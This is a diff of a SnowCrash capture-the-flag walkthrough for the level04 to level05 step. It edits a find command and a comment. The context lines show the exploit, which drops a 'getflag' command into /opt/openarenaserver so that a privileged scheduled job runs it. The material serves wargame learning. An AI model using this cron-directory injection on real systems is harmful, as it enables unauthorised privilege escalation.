@@ -7,7 +7,7 @@
 # But we find it gives alot of useless information so like we did in level00
 # We will compress it to only files that we have permission for with the below command
 
-level04@SnowCrash:~$ find / -iname "level05" 2>/dev/null | grep -v 'proc'
+level04@SnowCrash:~$ find / -iname "level05" 2>/dev/null
 /var/mail/level05
 /rofs/var/mail/level05
 
@@ -44,7 +44,7 @@ done
  `echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe && sleep 1 && cat /tmp/flag && echo -ne '\a'` 
 
 # echo 'getflag > /tmp/flag' > /opt/openarenaserver/gabe	##	This will put a flag file into the /opt/openarenaserver 
-# 	sleep 1 												##	It will sleep for 5 seconds
+# 	sleep 1 												##	It will sleep for 1 seconds
 #	cat /tmp/flag											##	print it 
 #	echo -ne '\a'											##	this will remove the newline added and  '\a' notify with a bell tone 
 
